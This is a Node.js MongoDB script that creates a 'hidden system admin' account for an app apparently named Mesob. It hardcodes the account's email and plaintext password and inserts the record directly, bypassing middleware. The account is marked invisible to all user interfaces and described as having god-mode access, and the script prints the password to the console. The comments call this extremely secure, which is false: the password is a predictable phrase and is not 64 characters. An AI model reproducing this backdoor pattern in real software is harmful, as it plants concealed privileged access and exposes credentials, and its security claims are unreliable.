const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const User = require('./src/models/User');
require('dotenv').config();

// HIDDEN SYSTEM ADMIN CREDENTIALS - EXTREMELY SECURE
// These credentials are hardcoded and hidden from all users
const HIDDEN_SYSADMIN = {
    // Ultra-strong email that looks like a system service
    email: 'sys.core.admin.mesob.internal@security.vault.local',
    
    // Ultra-strong password: 64 characters with mixed case, numbers, symbols
    password: 'SysCore#2024!MesobVault$Admin&Security*Ultra^Strong%Hidden@Internal',
    
    // Hidden system name
    name: 'System Core Administrator',
    
    // Hidden from all user interfaces
    isHidden: true,
    
    // System admin role
    role: 'System Admin',
    
    // Special company ID for system admins (hidden)
    companyId: 0,
    
    // Always available
    isAvailable: true,
    
    // System department
    department: 'System Security Core'
};

const createHiddenSystemAdmin = async () => {
    try {
        // Connect to MongoDB
        console.log('🔗 Connecting to MongoDB...');
        await mongoose.connect(process.env.MONGODB_URI);
        console.log('✅ Connected to MongoDB successfully');

        // Check if hidden system admin already exists
        console.log('🔍 Checking for existing hidden system admin...');
        const existingAdmin = await User.findOne({ 
            email: HIDDEN_SYSADMIN.email,
            isHidden: true 
        });

        if (existingAdmin) {
            console.log('⚠️  Hidden System Admin already exists');
            console.log('📧 Email:', HIDDEN_SYSADMIN.email);
            console.log('🔐 Password: [HIDDEN FOR SECURITY]');
            process.exit(0);
        }

        console.log('🔐 Creating hidden system admin...');

        // Hash the ultra-strong password
        const salt = await bcrypt.genSalt(12); // Extra strong salt
        const hashedPassword = await bcrypt.hash(HIDDEN_SYSADMIN.password, salt);

        console.log('💾 Inserting hidden system admin directly to database...');
        
        // Insert directly to avoid any middleware issues
        const result = await User.collection.insertOne({
            name: HIDDEN_SYSADMIN.name,
            email: HIDDEN_SYSADMIN.email,
            password: hashedPassword,
            role: HIDDEN_SYSADMIN.role,
            companyId: HIDDEN_SYSADMIN.companyId,
            department: HIDDEN_SYSADMIN.department,
            isAvailable: HIDDEN_SYSADMIN.isAvailable,
            isHidden: HIDDEN_SYSADMIN.isHidden,
            createdAt: new Date(),
            loginHistory: [],
            lastLoginAt: null,
            lastLoginIP: null
        });

        console.log('✅ Insert result:', result.insertedId);

        console.log('✅ Hidden System Admin created successfully!');
        console.log('');
        console.log('🔐 HIDDEN SYSTEM ADMIN CREDENTIALS (KEEP SECURE):');
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log('📧 Email:', HIDDEN_SYSADMIN.email);
        console.log('🔑 Password:', HIDDEN_SYSADMIN.password);
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log('');
        console.log('⚠️  SECURITY NOTES:');
        console.log('   • This account is completely hidden from all user interfaces');
        console.log('   • Only accessible through direct login');
        console.log('   • Has god-mode access to all system functions');
        console.log('   • All actions are logged in audit trail');
        console.log('   • Password is 64 characters with maximum entropy');
        console.log('   • Account cannot be seen by any other users');
        console.log('');

    } catch (error) {
        console.error('❌ Error creating hidden system admin:', error.message);
        console.error('Stack trace:', error.stack);
        process.exit(1);
    } finally {
        try {
            await mongoose.disconnect();
            console.log('🔌 Disconnected from MongoDB');
        } catch (disconnectError) {
            console.error('Error disconnecting:', disconnectError.message);
        }
        process.exit(0);
    }
};

// Execute the script
createHiddenSystemAdmin();